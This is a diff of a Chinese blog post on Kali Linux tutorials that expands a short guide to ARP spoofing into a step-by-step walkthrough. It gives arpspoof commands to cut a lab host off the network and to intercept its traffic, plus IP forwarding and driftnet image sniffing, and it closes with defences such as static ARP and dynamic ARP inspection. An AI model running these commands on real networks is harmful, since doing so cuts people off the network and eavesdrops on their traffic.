@@ -16,23 +16,22 @@
   <meta name="author" content="Ninja">
   <meta name="keywords" content="">
   
-    <meta name="description" content="0、简介arp攻击又称为中间人攻击，是一种在局域网中使用的攻击手段。  1、断网攻击攻击时,目标网络断开。攻击结束后,目标网络恢复。 1234# 探测存活主机fping -a -g 192.168.118.1&#x2F;24# arpspoof -i 网卡 -t 目标IP 网关arpspoof -i eth0 -t 192.168.118.138 192.168.118.2     2、arp欺骗arp欺骗">
+    <meta name="description" content="0、简介ARP攻击，又称为中间人攻击（Man-in-the-Middle，MITM），是局域网中常见的一种攻击手法。攻击者通过伪造ARP响应包，将自己的MAC地址欺骗成网关或目标主机的MAC地址，从而截获、篡改甚至中断网络流量，实现对通信内容的监听和控制。 这种攻击威力强大且隐蔽，常用于网络钓鱼、数据窃取以及会话劫持等攻击场景，是网络安全防御中不可忽视的风险。  1、断网攻击断网攻击是利用ARP欺">
 <meta property="og:type" content="article">
-<meta property="og:title" content="kali系统(中间人)arp攻击">
+<meta property="og:title" content="Kali系统中间人攻击 — ARP欺骗详解">
 <meta property="og:url" content="http://example.com/2020/04/30/kali%E7%B3%BB%E7%BB%9F(%E4%B8%AD%E9%97%B4%E4%BA%BA)arp%E6%94%BB%E5%87%BB/index.html">
 <meta property="og:site_name" content="Ninja&#39;s blog - 学与用">
-<meta property="og:description" content="0、简介arp攻击又称为中间人攻击，是一种在局域网中使用的攻击手段。  1、断网攻击攻击时,目标网络断开。攻击结束后,目标网络恢复。 1234# 探测存活主机fping -a -g 192.168.118.1&#x2F;24# arpspoof -i 网卡 -t 目标IP 网关arpspoof -i eth0 -t 192.168.118.138 192.168.118.2     2、arp欺骗arp欺骗">
+<meta property="og:description" content="0、简介ARP攻击，又称为中间人攻击（Man-in-the-Middle，MITM），是局域网中常见的一种攻击手法。攻击者通过伪造ARP响应包，将自己的MAC地址欺骗成网关或目标主机的MAC地址，从而截获、篡改甚至中断网络流量，实现对通信内容的监听和控制。 这种攻击威力强大且隐蔽，常用于网络钓鱼、数据窃取以及会话劫持等攻击场景，是网络安全防御中不可忽视的风险。  1、断网攻击断网攻击是利用ARP欺">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191225214057.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191225220422-1024x348.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191225220447-1024x345.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191225221700.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191225224557-1024x427.png">
 <meta property="article:published_time" content="2020-04-30T07:17:25.000Z">
-<meta property="article:modified_time" content="2025-07-11T03:50:55.392Z">
+<meta property="article:modified_time" content="2025-07-11T08:14:53.153Z">
 <meta property="article:author" content="Ninja">
-<meta property="article:tag" content="arp攻击">
-<meta property="article:tag" content="kali">
+<meta property="article:tag" content="ARP攻击">
+<meta property="article:tag" content="中间人攻击">
+<meta property="article:tag" content="Kali Linux">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191225214057.png">
   
@@ -40,7 +39,7 @@
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>kali系统(中间人)arp攻击 - Ninja&#39;s blog - 学与用</title>
+  <title>Kali系统中间人攻击 — ARP欺骗详解 - Ninja&#39;s blog - 学与用</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -258,7 +257,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="kali系统(中间人)arp攻击"></span>
+            <span id="subtitle" data-typed-text="Kali系统中间人攻击 — ARP欺骗详解"></span>
           
         </div>
 
@@ -281,7 +280,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          167 字
+          831 字
         
       </span>
     
@@ -292,7 +291,7 @@
         
         
         
-          2 分钟
+          7 分钟
         
       </span>
     
@@ -337,12 +336,12 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">kali系统(中间人)arp攻击</h1>
+            <h1 id="seo-header">Kali系统中间人攻击 — ARP欺骗详解</h1>
             
               <p id="updated-time" class="note note-info" style="">
                 
                   
-                    本文最后更新于 2025年7月11日 中午
+                    本文最后更新于 2025年7月11日 下午
                   
                 
               </p>
@@ -350,18 +349,61 @@
             
               <div class="markdown-body">
                 
-                <h4 id="0、简介"><a href="#0、简介" class="headerlink" title="0、简介"></a>0、简介</h4><p>arp攻击又称为中间人攻击，是一种在局域网中使用的攻击手段。 </p>
-<h4 id="1、断网攻击"><a href="#1、断网攻击" class="headerlink" title="1、断网攻击"></a>1、断网攻击</h4><p>攻击时,目标网络断开。攻击结束后,目标网络恢复。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 探测存活主机</span><br>fping -a -g 192.168.118.1/24<br><span class="hljs-comment"># arpspoof -i 网卡 -t 目标IP 网关</span><br>arpspoof -i eth0 -t 192.168.118.138 192.168.118.2<br></code></pre></td></tr></table></figure>
+                <h2 id="0、简介"><a href="#0、简介" class="headerlink" title="0、简介"></a>0、简介</h2><p>ARP攻击，又称为中间人攻击（Man-in-the-Middle，MITM），是局域网中常见的一种攻击手法。攻击者通过伪造ARP响应包，将自己的MAC地址欺骗成网关或目标主机的MAC地址，从而截获、篡改甚至中断网络流量，实现对通信内容的监听和控制。</p>
+<p>这种攻击威力强大且隐蔽，常用于网络钓鱼、数据窃取以及会话劫持等攻击场景，是网络安全防御中不可忽视的风险。</p>
+<hr>
+<h2 id="1、断网攻击"><a href="#1、断网攻击" class="headerlink" title="1、断网攻击"></a>1、断网攻击</h2><p>断网攻击是利用ARP欺骗的手段，强制目标主机与网络断开连接。当攻击结束后，目标网络即可自动恢复。</p>
+<h3 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h3><ol>
+<li><strong>探测局域网存活主机</strong></li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">fping -a -g 192.168.118.1/24<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191225214057.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191225220422-1024x348.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191225220447-1024x345.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<h4 id="2、arp欺骗"><a href="#2、arp欺骗" class="headerlink" title="2、arp欺骗"></a>2、arp欺骗</h4><p>arp欺骗，首先要开启IP转发功能，否则会使目标机断网。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 开启arp转发 0是关闭，1是开启</span><br><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward<br><br><span class="hljs-comment"># arpspoof -i 网卡 -t 目标IP 网关</span><br>arpspoof -i eth0 -t 192.168.118.138 192.168.118.2<br><br><span class="hljs-comment"># 使用图片嗅探工具来捕获目标主机浏览的图片</span><br>driftnet -i eth0<br></code></pre></td></tr></table></figure>
+<p>该命令扫描指定网段内的所有活跃IP，列出存活的设备，方便后续定位攻击目标。</p>
+<ol start="2">
+<li><strong>对目标主机进行断网攻击</strong></li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">arpspoof -i eth0 -t 192.168.118.138 192.168.118.2<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191225221700.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191225224557-1024x427.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>参数说明：</p>
+<ul>
+<li><code>-i eth0</code>：指定网卡接口。</li>
+<li><code>-t 192.168.118.138</code>：目标主机IP。</li>
+<li><code>192.168.118.2</code>：网关IP。</li>
+</ul>
+<p>该命令将目标主机的ARP缓存欺骗成攻击者的MAC地址，导致目标主机无法正常访问网络，实现断网效果。</p>
+<hr>
+<h2 id="2、ARP欺骗实现中间人攻击"><a href="#2、ARP欺骗实现中间人攻击" class="headerlink" title="2、ARP欺骗实现中间人攻击"></a>2、ARP欺骗实现中间人攻击</h2><p>ARP欺骗通过欺骗目标主机和网关的ARP缓存，实现攻击者在通信链路中间，拦截、篡改数据包。</p>
+<blockquote>
+<p><strong>注意：</strong> 为保证中间人攻击的正常进行，需先开启IP转发功能，否则会导致目标主机断网。</p>
+</blockquote>
+<h3 id="开启IP转发"><a href="#开启IP转发" class="headerlink" title="开启IP转发"></a>开启IP转发</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward<br></code></pre></td></tr></table></figure>
+
+<p>此命令开启Linux系统的IP数据包转发功能，使攻击机能够作为中间节点转发网络流量，确保目标主机网络不被中断。</p>
+<h3 id="启动ARP欺骗"><a href="#启动ARP欺骗" class="headerlink" title="启动ARP欺骗"></a>启动ARP欺骗</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">arpspoof -i eth0 -t 192.168.118.138 192.168.118.2<br>arpspoof -i eth0 -t 192.168.118.2 192.168.118.138<br></code></pre></td></tr></table></figure>
+
+<p>这里同时对目标主机和网关进行欺骗，实现双向通信劫持。</p>
+<h3 id="利用图片嗅探工具捕获数据"><a href="#利用图片嗅探工具捕获数据" class="headerlink" title="利用图片嗅探工具捕获数据"></a>利用图片嗅探工具捕获数据</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">driftnet -i eth0<br></code></pre></td></tr></table></figure>
+
+<p><code>driftnet</code>可以监听通过网卡传输的图片数据，捕获目标主机访问网页时加载的图片，直观展示中间人攻击带来的数据泄露。</p>
+<hr>
+<h2 id="3、工具介绍"><a href="#3、工具介绍" class="headerlink" title="3、工具介绍"></a>3、工具介绍</h2><ul>
+<li><strong>fping</strong>：快速探测存活主机的工具，适合批量扫描网络。</li>
+<li><strong>arpspoof</strong>：ARP欺骗工具，模拟ARP响应包，伪造MAC-IP映射。</li>
+<li><strong>driftnet</strong>：图像嗅探工具，监听网络中的图片资源。</li>
+</ul>
+<hr>
+<h2 id="4、防御建议"><a href="#4、防御建议" class="headerlink" title="4、防御建议"></a>4、防御建议</h2><ul>
+<li><strong>开启静态ARP绑定</strong>：为关键设备配置静态ARP表，防止ARP缓存被恶意篡改。</li>
+<li><strong>使用安全交换机</strong>：启用ARP防护功能，如动态ARP检查（DAI）。</li>
+<li><strong>网络隔离</strong>：合理划分子网，限制广播域大小，降低攻击面。</li>
+<li><strong>监控ARP流量</strong>：利用入侵检测系统（IDS）检测异常ARP包。</li>
+</ul>
+<hr>
+<h2 id="5、总结"><a href="#5、总结" class="headerlink" title="5、总结"></a>5、总结</h2><p>ARP欺骗作为一种经典中间人攻击手法，能够在局域网环境下有效拦截和篡改数据流量。熟悉其攻击原理及操作流程，对于网络安全攻防及安全加固都有重要意义。通过合理配置网络和增强监控，可以有效防范此类攻击，保障局域网通信的安全性。</p>
+<hr>
+<h3 id="附图"><a href="#附图" class="headerlink" title="附图"></a>附图</h3><p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191225214057.png" srcset="/img/loading.gif" lazyload alt="ARP断网攻击示例"></p>
+<p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191225220422-1024x348.png" srcset="/img/loading.gif" lazyload alt="ARP欺骗攻击效果"></p>
+<p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/QQ%E6%88%AA%E5%9B%BE20191225224557-1024x427.png" srcset="/img/loading.gif" lazyload alt="driftnet嗅探图片"></p>
 
                 
               </div>
@@ -395,9 +437,11 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/arp%E6%94%BB%E5%87%BB/" class="print-no-link">#arp攻击</a>
+        <a href="/tags/ARP%E6%94%BB%E5%87%BB/" class="print-no-link">#ARP攻击</a>
       
-        <a href="/tags/kali/" class="print-no-link">#kali</a>
+        <a href="/tags/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/" class="print-no-link">#中间人攻击</a>
+      
+        <a href="/tags/Kali-Linux/" class="print-no-link">#Kali Linux</a>
       
     </div>
   
@@ -411,9 +455,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/01/28/Windows%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%AB%AF%E5%8F%A3%E5%92%8Cssh%E7%AB%AF%E5%8F%A3%E4%BF%AE%E6%94%B9/" title="Windows远程桌面端口和ssh端口修改">
+                      <a href="/2021/01/28/Windows%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%AB%AF%E5%8F%A3%E5%92%8Cssh%E7%AB%AF%E5%8F%A3%E4%BF%AE%E6%94%B9/" title="Windows 远程桌面端口和 SSH 端口修改">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Windows远程桌面端口和ssh端口修改</span>
+                        <span class="hidden-mobile">Windows 远程桌面端口和 SSH 端口修改</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
